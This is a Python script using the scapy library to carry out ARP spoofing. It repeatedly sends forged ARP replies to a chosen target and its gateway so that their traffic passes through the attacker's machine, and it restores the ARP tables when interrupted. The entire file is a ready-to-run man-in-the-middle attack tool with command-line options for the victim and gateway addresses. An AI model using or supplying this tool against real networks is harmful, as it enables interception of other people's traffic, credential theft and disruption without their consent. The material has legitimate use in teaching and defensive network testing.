#!usr/bin/evn python

import scapy.all as scapy
import sys
import time
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-ip", dest="target_ip", help="Target IP for spoofing gateway.")
    parser.add_option("-g", "--gateway-ip", dest="gateway_ip", help="Gateway IP for spoofing Target.")
    (options, argument) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an target_ip, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify an gateway_ip, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    options = get_arguments()
    sent_packet_count = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        print("\n[-] Exit from This proocess to Press CTRL + C")
        sent_packet_count += 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ....... Resetting ARP tables...... Please wait.\n")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
